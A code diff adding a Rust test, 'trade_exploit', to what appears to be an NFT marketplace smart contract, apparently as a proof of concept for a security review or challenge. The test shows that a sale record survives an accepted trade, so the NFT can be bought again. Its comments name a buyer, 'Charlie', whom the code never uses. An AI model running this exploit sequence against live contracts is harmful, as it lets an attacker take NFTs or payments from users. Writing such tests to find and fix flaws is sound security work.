@@ -448,4 +448,141 @@ pub mod tests {
             .unwrap();
         assert_eq!(owner_of.owner, USER1.to_string());
     }
+
+    #[test]
+    fn trade_exploit() {
+        let (mut app, contract_addr, token_addr) = proper_instantiate();
+
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT1.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT2.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // 1. Alice lists an NFT (NFT1) for sale and marks it as tradable.
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::NewSale {
+                id: NFT1.to_string(),
+                price: Uint128::from(100u128),
+                tradable: true,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // 2. Bob offers to trade one of his NFTs (NFT2) for Alice's NFT1.
+        // Create trade offer
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::NewTrade {
+                target: NFT1.to_string(),
+                offered: NFT2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // 3. Alice accepts the trade. NFT1 is transferred to Bob, and NFT2 is transferred to Alice. The trade record is removed.
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptTrade {
+                id: NFT1.to_string(),
+                trader: USER2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // 4. However, the sale record for NFT1 is still in place, and the trade owner is Alice.
+        let sale_info: Sale = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::GetSale {
+                    id: NFT1.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(sale_info.owner, USER1.to_string());
+
+        // 5. Charlie tries to buy NFT1, and pays Alice.
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT1.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        app = mint_tokens(app, USER1.to_owned(), sale_info.price);
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::BuyNFT {
+                id: NFT1.to_string(),
+            },
+            &[coin(100u128, DENOM)],
+        )
+        .unwrap();
+
+        // confirm Alice has NFT2 and funds
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr.clone(),
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT1.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER1.to_string());
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr,
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT2.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER1.to_string());
+        // confirm balance of USER1
+        let balance = app
+            .wrap()
+            .query_balance(USER1.to_string(), DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::from(100u128));
+    }
 }
